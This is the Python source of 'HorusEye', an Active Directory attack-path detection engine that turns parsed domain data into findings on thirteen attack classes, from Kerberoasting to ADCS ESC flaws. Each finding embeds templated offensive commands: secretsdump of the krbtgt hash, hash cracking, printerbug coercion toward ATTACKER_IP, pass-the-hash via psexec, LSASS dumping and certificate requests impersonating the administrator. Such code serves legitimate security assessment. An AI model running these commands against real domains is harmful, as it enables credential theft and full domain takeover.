"""
HorusEye — Attack Path Detection Engine

Consumes the normalized ``domain_data`` dict produced by ``parsers.all_parsers``
and emits a flat list of findings. Each finding is a dict:

    {
        "type":        "DCSYNC",                 # stable machine key
        "title":       "DCSync rights: HELPDESK", # human summary
        "affected":    "HELPDESK@CORP.LOCAL",     # principal / object
        "severity":    "CRITICAL",                # CRITICAL|HIGH|MEDIUM|LOW|INFO
        "description": "...",                     # why it matters
        "commands":    ["impacket-secretsdump ..."],
        "references":  ["https://..."],           # optional reading
    }

The scorer (``core.path_scorer``) ranks these afterwards. Detections are
intentionally assessment-grade: they report *where* a misconfiguration exists
and the standard, publicly documented command to validate it — the same
references BloodHound, PingCastle and the tool's own README already surface.
"""
from __future__ import annotations

from typing import Dict, List, Set


# ── ACL right classes ──────────────────────────────────────────────────────
# RightName values as emitted by SharpHound / BloodHound CE (case-insensitive).
_DCSYNC_RIGHTS = {
    "dcsync",
    "getchanges",
    "getchangesall",
    "getchangesinfilteredset",
    "all",  # "All" extended right on the domain head implies replication
}

# Dangerous object-takeover ACEs → map right to (label, severity_hint)
_ABUSE_RIGHTS = {
    "genericall":          "full control (GenericAll)",
    "genericwrite":        "property write (GenericWrite)",
    "writedacl":           "DACL rewrite (WriteDacl)",
    "writeowner":          "ownership takeover (WriteOwner)",
    "owns":                "ownership (Owns)",
    "forcechangepassword": "password reset (ForceChangePassword)",
    "addmember":           "group write (AddMember)",
    "addself":             "self-add to group (AddSelf)",
    "allextendedrights":   "all extended rights",
    "addkeycredentiallink": "shadow-credentials (AddKeyCredentialLink)",
    "writespn":            "targeted kerberoast (WriteSPN)",
    "writeaccountrestrictions": "account-restriction write",
}

# Group names that confer domain-takeover-equivalent privilege.
_TIER0_GROUPS = (
    "DOMAIN ADMINS", "ENTERPRISE ADMINS", "SCHEMA ADMINS", "ADMINISTRATORS",
    "DOMAIN CONTROLLERS", "ENTERPRISE DOMAIN CONTROLLERS", "ACCOUNT OPERATORS",
    "BACKUP OPERATORS", "PRINT OPERATORS", "SERVER OPERATORS",
    "GROUP POLICY CREATOR OWNERS", "DNSADMINS", "KEY ADMINS",
    "ENTERPRISE KEY ADMINS", "CERT PUBLISHERS",
)


class AttackDetector:
    """Detects AD attack paths from parsed domain data.

    Detection coverage (README types 1-13):
        1  Kerberoasting              8  Pass-the-Hash
        2  AS-REP Roasting            9  ADCS ESC1-ESC8
        3  DCSync                    10  Domain Trusts
        4  ACL Abuse                 11  Privileged Sessions
        5  GPO Abuse                 12  Weak Password Policy
        6  Unconstrained Delegation  13  Stale Admin Accounts
        7  Constrained Delegation
    """

    def __init__(self, domain_data: Dict):
        self.data = domain_data or {}
        self.domain = self.data.get("domain", "") or ""
        self.dc_ip = self.data.get("dc_ip") or self.data.get("dc") or ""
        self._privileged = self._compute_privileged_principals()

    # ── Public entry point ──────────────────────────────────────────────────
    def detect_all(self) -> List[Dict]:
        findings: List[Dict] = []
        for detector in (
            self._detect_kerberoasting,          # 1
            self._detect_asrep_roasting,          # 2
            self._detect_dcsync,                  # 3
            self._detect_acl_abuse,               # 4
            self._detect_gpo_abuse,               # 5
            self._detect_unconstrained_deleg,     # 6
            self._detect_constrained_deleg,       # 7
            self._detect_pass_the_hash,           # 8
            self._detect_adcs,                    # 9
            self._detect_domain_trusts,           # 10
            self._detect_privileged_sessions,     # 11
            self._detect_weak_password_policy,    # 12
            self._detect_stale_admins,            # 13
        ):
            try:
                findings.extend(detector() or [])
            except Exception:
                # A malformed source must never take down the whole run.
                continue
        return findings

    # ── Privilege model ──────────────────────────────────────────────────────
    def _compute_privileged_principals(self) -> Set[str]:
        """Build a case-insensitive set of principals that are Tier-0 /
        admin-equivalent, used to escalate finding severity."""
        priv: Set[str] = set()

        for u in self.data.get("users", []):
            if u.get("admincount"):
                priv.add(self._norm(u.get("name", "")))

        for g in self.data.get("groups", []):
            gname = (g.get("name", "") or "").upper()
            is_tier0 = g.get("admincount") or any(t in gname for t in _TIER0_GROUPS)
            if is_tier0:
                priv.add(self._norm(g.get("name", "")))
                for member in g.get("members", []) or []:
                    priv.add(self._norm(member))

        priv.discard("")
        return priv

    def _is_privileged(self, name: str) -> bool:
        return self._norm(name) in self._privileged

    # ── 1. Kerberoasting ──────────────────────────────────────────────────────
    def _detect_kerberoasting(self) -> List[Dict]:
        out = []
        for spn in self.data.get("spns", []):
            user = spn.get("user", "") if isinstance(spn, dict) else str(spn)
            if not user:
                continue
            priv = self._is_privileged(user)
            svc = ", ".join(spn.get("spns", [])) if isinstance(spn, dict) else ""
            out.append({
                "type": "KERBEROASTING",
                "title": f"Kerberoastable account: {user}"
                         + (" [privileged]" if priv else ""),
                "affected": user,
                "severity": "CRITICAL" if priv else "HIGH",
                "description": (
                    "Service account exposes an SPN, so any authenticated user can "
                    "request a TGS and crack it offline. "
                    + ("This account is a member of a Tier-0 group — cracking it "
                       "is a direct path to Domain Admin." if priv else
                       "Prioritise if the cleartext grants onward access.")
                    + (f" SPNs: {svc}" if svc else "")
                ),
                "commands": [
                    f"impacket-GetUserSPNs {self.domain}/USER:PASS "
                    f"-dc-ip {self.dc_ip or 'DC_IP'} -request -outputfile kerb.hash",
                    "hashcat -m 13100 kerb.hash wordlist.txt -r rules/best64.rule",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1558/003/",
                ],
            })
        return out

    # ── 2. AS-REP Roasting ──────────────────────────────────────────────────────
    def _detect_asrep_roasting(self) -> List[Dict]:
        out = []
        for user in self.data.get("asrep_users", []):
            if not user:
                continue
            priv = self._is_privileged(user)
            out.append({
                "type": "ASREP_ROASTING",
                "title": f"AS-REP roastable: {user}"
                         + (" [privileged]" if priv else ""),
                "affected": user,
                "severity": "CRITICAL" if priv else "HIGH",
                "description": (
                    "Account has DONT_REQUIRE_PREAUTH set, so its AS-REP can be "
                    "requested without credentials and cracked offline."
                    + (" Account is Tier-0 — a direct DA path." if priv else "")
                ),
                "commands": [
                    f"impacket-GetNPUsers {self.domain}/{user} -no-pass "
                    f"-dc-ip {self.dc_ip or 'DC_IP'} -format hashcat -outputfile asrep.hash",
                    "hashcat -m 18200 asrep.hash wordlist.txt -r rules/best64.rule",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1558/004/",
                ],
            })
        return out

    # ── 3. DCSync ──────────────────────────────────────────────────────────────
    def _detect_dcsync(self) -> List[Dict]:
        out = []
        # Group replication rights by principal so GetChanges + GetChangesAll
        # on the domain head collapse into a single DCSync finding.
        by_principal: Dict[str, Set[str]] = {}
        for ace in self.data.get("acls", []):
            right = self._right(ace)
            if right in _DCSYNC_RIGHTS:
                target = (ace.get("target", "") or "").upper()
                # Replication rights only matter on the domain object itself.
                if target and self.domain and self.domain.upper() not in target:
                    # still record — some exports name the target differently
                    pass
                principal = ace.get("principal", "")
                by_principal.setdefault(principal, set()).add(right)

        for principal, rights in by_principal.items():
            if not principal:
                continue
            out.append({
                "type": "DCSYNC",
                "title": f"DCSync rights: {principal}",
                "affected": principal,
                "severity": "CRITICAL",
                "description": (
                    "Principal holds directory-replication rights "
                    f"({', '.join(sorted(rights))}) on the domain. It can replicate "
                    "secrets from the DC — including the krbtgt hash — without "
                    "running code on a Domain Controller."
                ),
                "commands": [
                    f"impacket-secretsdump {self.domain}/{self._short(principal)}@"
                    f"{self.dc_ip or 'DC_IP'} -just-dc",
                    f"impacket-secretsdump {self.domain}/{self._short(principal)}@"
                    f"{self.dc_ip or 'DC_IP'} -just-dc-user {self.domain.split('.')[0] or 'DOMAIN'}\\\\krbtgt",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1003/006/",
                ],
            })
        return out

    # ── 4. ACL Abuse ──────────────────────────────────────────────────────────
    def _detect_acl_abuse(self) -> List[Dict]:
        out = []
        for ace in self.data.get("acls", []):
            right = self._right(ace)
            if right not in _ABUSE_RIGHTS:
                continue
            principal = ace.get("principal", "")
            target = ace.get("target", "")
            if not principal or not target or principal == target:
                continue
            # Self-referential or Everyone/Authenticated-Users noise is still
            # reported but a takeover of a Tier-0 target is the CRITICAL case.
            target_priv = self._is_privileged(target) or self._is_domain_object(target)
            out.append({
                "type": "ACL_ABUSE",
                "title": f"{_ABUSE_RIGHTS[right].capitalize()}: "
                         f"{principal} → {target}",
                "affected": f"{principal} → {target}",
                "severity": "CRITICAL" if target_priv else "HIGH",
                "description": (
                    f"{principal} has {_ABUSE_RIGHTS[right]} over {target}. "
                    + ("The target is Tier-0 / the domain object, so this edge is a "
                       "direct takeover primitive." if target_priv else
                       "Abusable to pivot toward higher-value objects.")
                ),
                "commands": self._acl_commands(right, target),
                "references": [
                    "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html",
                ],
            })
        return out

    def _acl_commands(self, right: str, target: str) -> List[str]:
        tgt = self._short(target)
        if right in ("forcechangepassword",):
            return [f"net rpc password \"{tgt}\" -U {self.domain}/USER%PASS -S {self.dc_ip or 'DC_IP'}"]
        if right in ("addmember", "addself"):
            return [f"net rpc group addmem \"{tgt}\" USER -U {self.domain}/USER%PASS -S {self.dc_ip or 'DC_IP'}"]
        if right in ("addkeycredentiallink",):
            return [f"certipy shadow auto -u USER@{self.domain} -p PASS -account {tgt}"]
        if right in ("genericall", "genericwrite", "writedacl", "writeowner", "owns"):
            return [
                f"# take ownership / grant rights over {tgt}, then abuse (targeted kerberoast or shadow creds)",
                f"certipy shadow auto -u USER@{self.domain} -p PASS -account {tgt}",
            ]
        return [f"# abuse {right} over {tgt} per BloodHound edge guidance"]

    # ── 5. GPO Abuse ──────────────────────────────────────────────────────────
    def _detect_gpo_abuse(self) -> List[Dict]:
        out = []
        gpo_names = {(g.get("name", "") or "").upper() for g in self.data.get("gpos", [])}
        for ace in self.data.get("acls", []):
            right = self._right(ace)
            if right not in ("genericall", "genericwrite", "writedacl", "writeowner", "owns"):
                continue
            target = ace.get("target", "")
            if (target or "").upper() not in gpo_names:
                continue
            principal = ace.get("principal", "")
            out.append({
                "type": "GPO_ABUSE",
                "title": f"Writable GPO: {principal} → {target}",
                "affected": f"{principal} → {target}",
                "severity": "HIGH",
                "description": (
                    f"{principal} can modify GPO '{target}'. Editing the GPO pushes "
                    "attacker-controlled policy (scheduled task, immediate task, "
                    "local-admin membership) to every linked computer or user."
                ),
                "commands": [
                    f"# enumerate links, then abuse with pyGPOAbuse / SharpGPOAbuse",
                    f"pygpoabuse.py {self.domain}/USER:PASS -gpo-id '<GUID>' -command 'whoami'",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1484/001/",
                ],
            })
        return out

    # ── 6. Unconstrained Delegation ──────────────────────────────────────────
    def _detect_unconstrained_deleg(self) -> List[Dict]:
        out = []
        for coll, kind in (("computers", "computer"), ("users", "account")):
            for obj in self.data.get(coll, []):
                if not obj.get("unconstrained_delegation"):
                    continue
                name = obj.get("name", "")
                out.append({
                    "type": "UNCONSTRAINED_DELEGATION",
                    "title": f"Unconstrained delegation: {name}",
                    "affected": name,
                    "severity": "CRITICAL",
                    "description": (
                        f"{kind.capitalize()} '{name}' is trusted for unconstrained "
                        "delegation. Coerce a DC to authenticate to it (PrinterBug / "
                        "PetitPotam) and capture a reusable TGT — including a DC's. "
                        "Verify this host is not itself a Domain Controller (where "
                        "the flag is expected)."
                    ),
                    "commands": [
                        f"# capture tickets on {name}, then coerce a DC:",
                        "python3 printerbug.py DOMAIN/USER:PASS@DC_IP ATTACKER_IP",
                        "impacket-rubeus monitor  # or Rubeus.exe monitor on the host",
                    ],
                    "references": [
                        "https://attack.mitre.org/techniques/T1558/",
                    ],
                })
        return out

    # ── 7. Constrained Delegation ──────────────────────────────────────────────
    def _detect_constrained_deleg(self) -> List[Dict]:
        out = []
        for coll, kind in (("computers", "computer"), ("users", "account")):
            for obj in self.data.get(coll, []):
                if not obj.get("trustedtoauth"):
                    continue
                name = obj.get("name", "")
                out.append({
                    "type": "CONSTRAINED_DELEGATION",
                    "title": f"Constrained delegation (protocol transition): {name}",
                    "affected": name,
                    "severity": "HIGH",
                    "description": (
                        f"'{name}' is configured for constrained delegation with "
                        "protocol transition (TrustedToAuthForDelegation). If you "
                        "control it, you can impersonate any user to its allowed "
                        "services via S4U2Self + S4U2Proxy."
                    ),
                    "commands": [
                        f"impacket-getST -spn SERVICE/TARGET -impersonate Administrator "
                        f"{self.domain}/{self._short(name)}:PASS -dc-ip {self.dc_ip or 'DC_IP'}",
                    ],
                    "references": [
                        "https://attack.mitre.org/techniques/T1558/003/",
                    ],
                })
        return out

    # ── 8. Pass-the-Hash (reusable admin access) ──────────────────────────────
    def _detect_pass_the_hash(self) -> List[Dict]:
        out = []
        admin_hosts = []
        for src in ("cme_data", "nxc_data"):
            admin_hosts.extend(self.data.get(src, {}).get("admin_hosts", []) or [])
        if len(admin_hosts) >= 2:
            hosts = ", ".join(sorted({h.get("ip", h.get("hostname", "")) for h in admin_hosts}))
            users = sorted({h.get("username", "") for h in admin_hosts if h.get("username")})
            out.append({
                "type": "PASS_THE_HASH",
                "title": f"Reusable admin access across {len(admin_hosts)} hosts",
                "affected": ", ".join(users) or "local admin",
                "severity": "HIGH",
                "description": (
                    "The same credential grants administrative access to multiple "
                    f"hosts ({hosts}). A single dumped NTLM hash can be sprayed to all "
                    "of them, and shared local-admin secrets enable lateral movement "
                    "without ever cracking a password."
                ),
                "commands": [
                    "nxc smb TARGETS -u Administrator -H <NTLM_HASH>",
                    "impacket-psexec -hashes :<NTLM_HASH> DOMAIN/Administrator@TARGET",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1550/002/",
                ],
            })
        return out

    # ── 9. ADCS ESC1-ESC8 ──────────────────────────────────────────────────────
    def _detect_adcs(self) -> List[Dict]:
        out = []
        adcs = self.data.get("adcs", {}) or {}
        for vuln in adcs.get("vulnerabilities", []) or []:
            esc = (vuln.get("esc", "") or "").upper()
            template = vuln.get("template", "")
            sev = vuln.get("severity") or ("CRITICAL" if esc in
                   ("ESC1", "ESC3", "ESC4", "ESC6", "ESC8") else "HIGH")
            out.append({
                "type": "ADCS_ESC",
                "title": f"ADCS {esc}: {template}" if template else f"ADCS {esc}",
                "affected": template or esc,
                "severity": sev,
                "description": vuln.get("description")
                    or f"Certificate template vulnerable to {esc}. Abusable to obtain "
                       "a certificate that authenticates as a privileged principal.",
                "commands": self._adcs_commands(esc, template),
                "references": [
                    "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
                ],
            })
        return out

    def _adcs_commands(self, esc: str, template: str) -> List[str]:
        tpl = template or "TEMPLATE"
        if esc in ("ESC1", "ESC2", "ESC3"):
            return [
                f"certipy req -u USER@{self.domain} -p PASS -ca CA -template {tpl} "
                f"-upn administrator@{self.domain}",
                "certipy auth -pfx administrator.pfx -dc-ip " + (self.dc_ip or "DC_IP"),
            ]
        if esc == "ESC8":
            return ["certipy relay -ca CA_HOST  # then coerce a DC via PetitPotam"]
        return [f"certipy find -u USER@{self.domain} -p PASS -vulnerable  # confirm {esc}"]

    # ── 10. Domain Trusts ──────────────────────────────────────────────────────
    def _detect_domain_trusts(self) -> List[Dict]:
        out = []
        for t in self.data.get("trusts", []):
            target = t.get("target_domain", "")
            if not target:
                continue
            direction = (t.get("direction", "") or "").lower()
            ttype = (t.get("type", "") or "").lower()
            transitive = t.get("transitive", False)
            bidir = "bidir" in direction or direction in ("3", "bidirectional")
            external = "external" in ttype or "forest" in ttype
            sev = "HIGH" if (bidir and external) else "MEDIUM"
            out.append({
                "type": "DOMAIN_TRUST",
                "title": f"Domain trust: {self.domain} ↔ {target}",
                "affected": target,
                "severity": sev,
                "description": (
                    f"Trust to '{target}' (direction={t.get('direction','?')}, "
                    f"type={t.get('type','?')}, transitive={transitive}). "
                    + ("Bidirectional forest trust — SID history / cross-forest "
                       "Kerberoasting may extend compromise across the boundary."
                       if (bidir and external) else
                       "Review for cross-domain escalation paths.")
                ),
                "commands": [
                    f"impacket-GetUserSPNs -target-domain {target} {self.domain}/USER:PASS "
                    f"-dc-ip {self.dc_ip or 'DC_IP'} -request",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1482/",
                ],
            })
        return out

    # ── 11. Privileged Sessions ──────────────────────────────────────────────
    def _detect_privileged_sessions(self) -> List[Dict]:
        out = []
        for s in self.data.get("sessions", []):
            user = s.get("UserName", "") or s.get("user", "")
            host = s.get("ComputerName", "") or s.get("ip", "")
            if not user or not self._is_privileged(user):
                continue
            out.append({
                "type": "PRIVILEGED_SESSION",
                "title": f"Privileged session: {user} on {host}",
                "affected": f"{user}@{host}",
                "severity": "HIGH",
                "description": (
                    f"Tier-0 principal {user} has a session on {host}. Local admin on "
                    f"{host} means that credential can be dumped from memory and reused."
                ),
                "commands": [
                    f"# with local admin on {host}, dump LSASS and extract {user}'s secret",
                    f"nxc smb {host} -u USER -p PASS --lsa",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1003/001/",
                ],
            })
        return out

    # ── 12. Weak Password Policy ──────────────────────────────────────────────
    def _detect_weak_password_policy(self) -> List[Dict]:
        pol = self.data.get("password_policy", {}) or {}
        if not pol:
            return []
        issues = []
        min_len = self._to_int(pol.get("min_length"))
        if min_len is not None and min_len < 8:
            issues.append(f"minimum length is {min_len} (recommend ≥ 14)")
        lockout = self._to_int(pol.get("lockout_threshold"))
        if lockout is not None and lockout == 0:
            issues.append("account lockout is disabled (unlimited guessing)")
        complexity = str(pol.get("complexity", "")).lower()
        if complexity in ("0", "false", "disabled", "off"):
            issues.append("complexity requirement is disabled")
        if not issues:
            return []
        return [{
            "type": "WEAK_PASSWORD_POLICY",
            "title": "Weak domain password policy",
            "affected": self.domain or "domain",
            "severity": "MEDIUM",
            "description": "Domain password policy weaknesses: " + "; ".join(issues)
                + ". These materially raise the success rate of password spraying.",
            "commands": [
                f"nxc smb {self.dc_ip or 'DC_IP'} -u USER -p PASS --pass-pol",
            ],
            "references": [
                "https://attack.mitre.org/techniques/T1110/003/",
            ],
        }]

    # ── 13. Stale Admin Accounts ──────────────────────────────────────────────
    def _detect_stale_admins(self) -> List[Dict]:
        out = []
        for u in self.data.get("users", []):
            if not u.get("admincount"):
                continue
            name = u.get("name", "")
            reasons = []
            if not u.get("enabled", True):
                reasons.append("disabled but still admin-flagged (adminCount=1)")
            if u.get("pwdneverexpires"):
                reasons.append("password never expires")
            if not reasons:
                continue
            out.append({
                "type": "STALE_ADMIN",
                "title": f"Stale privileged account: {name}",
                "affected": name,
                "severity": "LOW" if "disabled" in reasons[0] else "MEDIUM",
                "description": (
                    f"Privileged account '{name}': " + "; ".join(reasons) + ". "
                    "Lingering Tier-0 accounts widen the attack surface and are prime "
                    "spraying / re-enable targets."
                ),
                "commands": [
                    f"# review necessity; if unused, disable and strip group membership",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1078/002/",
                ],
            })
        return out

    # ── Helpers ────────────────────────────────────────────────────────────────
    @staticmethod
    def _right(ace: Dict) -> str:
        """Lower-cased ACL RightName for class matching."""
        return (ace.get("right", "") or "").strip().lower()

    @staticmethod
    def _norm(name: str) -> str:
        """Upper-case, strip domain suffix for comparison (USER@CORP → USER)."""
        n = (name or "").strip().upper()
        return n.split("@")[0] if "@" in n else n

    @staticmethod
    def _short(name: str) -> str:
        """SAM-style short name for command templates."""
        n = (name or "").strip()
        return n.split("@")[0] if "@" in n else n

    def _is_domain_object(self, target: str) -> bool:
        t = (target or "").upper()
        return bool(self.domain) and t == self.domain.upper()

    @staticmethod
    def _to_int(value):
        try:
            return int(str(value).strip())
        except (TypeError, ValueError):
            return None
